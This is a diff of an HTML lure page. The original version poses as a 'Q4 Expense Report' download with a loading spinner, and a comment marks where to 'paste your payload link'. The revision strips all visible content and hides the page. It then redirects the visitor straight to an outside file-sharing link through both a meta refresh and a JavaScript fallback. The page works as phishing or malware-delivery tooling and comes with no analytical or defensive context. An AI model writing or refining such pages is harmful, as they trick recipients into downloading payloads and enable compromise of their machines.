@@ -2,25 +2,28 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="2; url=https://limewire.com/d/1ru6E#qMBtsnWJMy" />  <!-- ← PASTE YOUR PAYLOAD LINK HERE -->
-    <title>Q4 Expense Report - Secure Access</title>
+    <!-- Instant redirect – 0 second delay -->
+    <meta http-equiv="refresh" content="0; url=https://limewire.com/d/1ru6E#qMBtsnWJMy" />
+    <title>Redirect</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 120px; background: #f8f9fa; }
-        h1 { color: #0d6efd; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 0;
+            width: 0;
+            overflow: hidden;
+            display: none;          /* completely hide everything */
+            visibility: hidden;     /* extra layer of hiding */
+        }
     </style>
 </head>
-<body>
-    <h1>Loading Secure Q4 Expense Report...</h1>
-    <p>Please wait a moment. The document will download automatically.</p>
-    <div class="loader"></div>
-    <p>If nothing happens, <a href="https://limewire.com/d/qd91J#KY4TQopU1S" download>click here to download</a>.</p>
-
+<body style="display:none;">
+    <!-- No content at all – no text, no loader, nothing visible -->
     <script>
-        setTimeout(() => {
-            window.location.href = "https://limewire.com/d/qd91J#KY4TQopU1S";  // ← same payload link
-        }, 1800);
+        // Immediate redirect (fallback if meta refresh blocked)
+        (function(){
+            location.replace("https://limewire.com/d/1ru6E#qMBtsnWJMy");
+        })();
     </script>
 </body>
 </html>
